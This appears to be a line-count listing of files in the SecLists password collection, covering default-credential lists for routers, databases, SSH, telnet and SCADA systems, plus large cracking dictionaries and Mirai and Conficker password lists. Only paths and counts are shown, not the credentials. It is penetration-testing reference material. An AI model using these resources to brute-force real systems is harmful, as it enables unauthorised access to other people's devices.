        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/allied-data_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tot_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telindus_default-users.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/smc_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/acorp_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/iskratel_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/cnet_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubiquiti_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/encore_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/quicktel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pci_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/awb-networks_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teracom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/blitzz_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/nokia_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/zioncom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telindus_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/surecom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/acorp_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hot_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/asmax_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/starbridge_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sky_default-passwords.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/Routers/technicolor_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradyne_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/crypto_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ambit_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inexq_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dovado_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mymax_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bec-technologies_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lectron_default-passwords.txt
       21 /usr/share/seclists/Passwords/Default-Credentials/Routers/huawei_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/digicom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubiquiti_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlive_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/franklin-wireless_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/solwise_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/baytec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/quicktel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/etec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trust_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/fritz-box_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/1net1_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/pirelli_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3bb_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/soho_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kingtype_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/baudtec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pentagram_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/solwise_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/readynet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zonet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airrouter_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/green-packet_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubee_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/asmax_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mitrastar_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cd-r-king_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sercomm_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/utstarcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/davolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sparkcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pentagram_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zoom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynamode_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gateway_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/100fio-networks_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/amped-wireless_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/noganet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/v-link_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/edimax_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/loopcomm_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bt_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pluscom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/actiontec_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/genexis_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/binatone_default-users.txt
       67 /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/cryptominers.txt
       23 /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
       18 /usr/share/seclists/Passwords/Default-Credentials/avaya_defaultpasslist.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/db2-betterdefaultpasslist.txt
      716 /usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt
      560 /usr/share/seclists/Passwords/Default-Credentials/telnet-phenoelit.txt
      112 /usr/share/seclists/Passwords/Default-Credentials/scada-pass.csv
       66 /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
       79 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt
       27 /usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt
      135 /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
   755995 /usr/share/seclists/Passwords/xato-net-10-million-passwords-dup.txt
    84198 /usr/share/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt
  1471056 /usr/share/seclists/Passwords/darkc0de.txt
    31700 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_with_leet_variations.txt
     5567 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_original.txt
    15326 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_lowercase.txt
    15326 /usr/share/seclists/Passwords/Books/greatest_books_of_all_time_uppercase.txt
      181 /usr/share/seclists/Passwords/Malware/conficker.txt
       60 /usr/share/seclists/Passwords/Malware/mirai-botnet.txt
        4 /usr/share/seclists/Passwords/citrix.txt
  1652903 /usr/share/seclists/Passwords/bt4-password.txt
       82 /usr/share/seclists/Passwords/clarkson-university-82.txt
   172696 /usr/share/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_pt_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_tr_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_fr_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_es_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_en_vowels_no_compounds_top-1000000.txt
  1000000 /usr/share/seclists/Passwords/Wikipedia/wikipedia_de_vowels_no_compounds_top-1000000.txt
       13 /usr/share/seclists/Passwords/Keyboard-Walks/README.md
     9608 /usr/share/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
   279616 /usr/share/seclists/Passwords/Keyboard-Walks/walk-the-line.txt
     6240 /usr/share/seclists/Passwords/days.txt
```s
